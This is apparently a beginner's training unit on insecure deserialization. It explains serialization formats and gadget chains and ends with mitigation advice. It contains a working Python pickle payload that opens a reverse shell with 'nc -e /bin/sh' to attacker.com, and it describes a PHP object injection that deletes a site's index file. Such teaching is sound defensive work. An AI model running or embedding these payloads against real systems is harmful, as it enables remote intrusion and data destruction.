# Insecure Deserialization (Conceptual)

## 1. Unit Brief: Turning Data into Code
Data serialization allows objects (like a User object) to be converted to a stream of bytes for storage/transmission. Deserialization converts those bytes back into an object. If the code blindly deserializes untrusted data, the code executes whatever logic is in the object's constructor/destructor.

## 2. Real-World Relevance
*   **Java, PHP, Python, .NET**: All have this issue.
*   **Log4j**: A form of JNDI injection often triggered via similar mechanisms.
*   **Impact**: Usually leads to Remote Code Execution (RCE).

## 3. Core Concepts

### Serialization Formats
*   **Java**: Begins with magic bytes `AC ED 00 05`.
*   **PHP**: `O:4:"User":2:{...}`
*   **Python**: Pickle modules.

### Gadget Chains
Deserialization exploits rarely work alone. They use "Gadgets"â€”pieces of code already present in the libraries the app uses (like Apache Commons). By chaining these snippets together, you build a RCE machine.

## 4. Practical Examples

### PHP Object Injection
Code: `unserialize($_COOKIE['data'])`
*   Class `LogFile`: Has a destructor `__destruct()` that deletes the file at `this->filename`.
*   **Attack**: Create a serialized `LogFile` object. Set `this->filename` to `index.php`.
*   **Result**: When the script finishes, the destructor runs and deletes the website's index.

### Python Pickle RCE
```python
import pickle
import os

class Evil(object):
    def __reduce__(self):
        return (os.system, ('nc -e /bin/sh attacker.com 4444',))

print(pickle.dumps(Evil()))
```
Sending this blob to a vulnerable Pickle listener grants a reverse shell.

## 5. Common Mistakes Beginners Make
*   **Writing Gadgets from Scratch**: Finding gadgets is hard. Use tools like `ysoserial`.
*   **Identifying it**: You need to spot the serialized blobs (Base64 strings) in cookies or params.

## 6. Key Takeaways
*   **Don't Serialize User Data**: There is rarely a safe way to do this. Use JSON instead.
*   **RCE Potential**: High.
